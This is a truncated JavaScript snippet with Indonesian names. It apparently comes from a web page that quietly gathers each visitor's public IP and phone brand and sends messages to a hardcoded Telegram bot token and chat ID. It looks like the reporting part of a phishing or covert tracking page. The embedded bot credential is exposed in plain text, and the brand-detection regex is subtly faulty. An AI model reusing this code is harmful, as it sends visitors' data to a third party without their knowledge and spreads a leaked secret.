const token = '7876416430:AAGfJpQqoNvDSbx4tpuJQPdy5k8vx7Uhndw';
const chat_id = '7777604508';

async function getIP() {
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    return data.ip;
  } catch (e) {
    return "Tidak diketahui";
  }
}

function getMerekHP() {
  const ua = navigator.userAgent;

  if (/Samsung/i.test(ua)) return "Samsung";
  if (/Xiaomi|Mi/i.test(ua)) return "Xiaomi";
  if (/Redmi/i.test(ua)) return "Redmi";
  if (/OPPO/i.test(ua)) return "Oppo";
  if (/Vivo/i.test(ua)) return "Vivo";
  if (/Realme/i.test(ua)) return "Realme";
  if (/iPhone/i.test(ua)) return "iPhone";
  if (/Asus/i.test(ua)) return "Asus";
  if (/Infinix/i.test(ua)) return "Infinix";
  if (/Huawei/i.test(ua)) return "Huawei";

  return "Tidak diketahui";
}

async function kirimPesanTelegram(pesan) {
  const url = `https://api.telegram.org/bot${token}/sendMessage`;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chat_id,
        text: pesan,
        parse_mode: "HTML"
      })
    });
  } catch (err) {
    console.error("Gagal kirim pesan ke Telegram:", err);
  }
        
